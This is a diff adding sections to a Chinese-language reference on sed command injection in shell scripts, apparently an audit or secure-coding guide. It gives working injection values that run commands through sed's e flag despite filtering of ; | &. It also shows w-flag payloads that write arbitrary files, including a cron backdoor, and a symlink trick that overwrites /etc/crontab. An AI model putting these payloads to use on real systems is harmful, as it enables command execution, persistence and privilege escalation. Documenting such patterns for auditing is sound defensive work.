@@ -97,3 +97,47 @@ sed -i "s/\(.*\)/$USER_REPLACE/" /etc/app.conf
 sed -i "/$USER_PATTERN/d" /etc/app.conf
 # USER_PATTERN = ".*" → 删除所有配置行
 ```
+
+### 命令注入 — 不闭合注入（绕过命令拼接符过滤）
+
+即使过滤了 `;`、`|`、`&` 等命令拼接符，只要允许 `/`（sed 定界符），就可能通过 e 或 w 参数实现不闭合注入：
+
+```bash
+# 场景 1: 匹配打印行
+sed -n "/${value}/p" config_file
+# 注入: value = "a/eid 1>&0/p"
+# e 优先级高于 p，命令被执行（需 config_file 中含字符 a）
+
+# 场景 2: 删除行
+sed -i "/^key=$value/d" config_file
+# 注入: value = "xxx/eid 1>&0/d"
+# e 优先级高于 d，命令被执行（需 config_file 中含 key=）
+
+# 场景 3: 替换行 — s 参数下 e 无法直接生效，改用 w 参数写文件
+sed -i "s/pattern/$value/" config_file
+# 注入: value = "test/w/etc/cron.d/backdoor"
+# 将匹配内容写入任意文件
+
+# 场景 3 提权利用：创建软链接文件名为 g
+# ln -s /etc/crontab g
+# 注入: value = "test/w/g"
+# sed 将 test 写入文件 g（实际写入 /etc/crontab）
+
+# 场景 4: 新增行 — a 参数后所有内容当作文本，需多行输入换行绕过
+sed -i "1a $value" config_file
+# 如果 value 支持多行输入（如从配置文件读取），换行后注入 e 命令
+```
+
+### 操作任意文件 — w 参数覆盖写（不闭合场景）
+
+```bash
+# 在 s 参数替换模式下，e 参数无法不闭合使用，但 w 参数可以
+sed -i "s/pattern/$value/g" config_file
+# value = "replacement/w/tmp/evil"
+# 将 replacement 写入 /tmp/evil
+
+# 配合软链接实现任意文件覆盖：
+# 1. 创建软链接: ln -s /target/file g
+# 2. 注入: value = "data/w/g"
+# 3. sed 将 data 写入 g → 实际覆盖 /target/file
+```
